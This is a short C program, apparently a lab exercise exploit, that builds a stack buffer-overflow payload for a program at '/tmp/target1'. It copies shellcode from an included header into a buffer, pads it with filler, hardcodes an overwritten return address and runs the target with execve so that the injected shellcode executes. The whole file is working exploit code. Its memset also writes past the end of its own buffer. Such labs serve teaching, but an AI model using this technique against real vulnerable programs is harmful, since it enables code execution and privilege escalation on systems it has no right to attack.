#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  // Fill a buffer to overflow return address of foo to shell script to execute off stack
  // Size of buffer 768
  int max_size = 768;
  max_size = max_size + 12;


  // Redundant copying of "shellcode" to move it from static to local stack memory
 
  char overflow_buf[max_size];
  memset(overflow_buf, (int) NULL, max_size+strlen(shellcode));

   
  int i = 0;
  for (i = 0; i < strlen(shellcode); i++) {
    overflow_buf[i] = shellcode[i];
  }

  while(i < max_size) {
    overflow_buf[i] = 0xC; // arbitrary garbage values
    i++;
  } 

  overflow_buf[i] = 0x30;
  overflow_buf[i+1] = 0xF8;
  overflow_buf[i+2] = 0xFF;
  overflow_buf[i+3] = 0xBF;
  overflow_buf[i+4] = '\0';

  args[0] = TARGET; 
  //args[1] = "hi there";
  args[1] = overflow_buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");


  return 0;
}
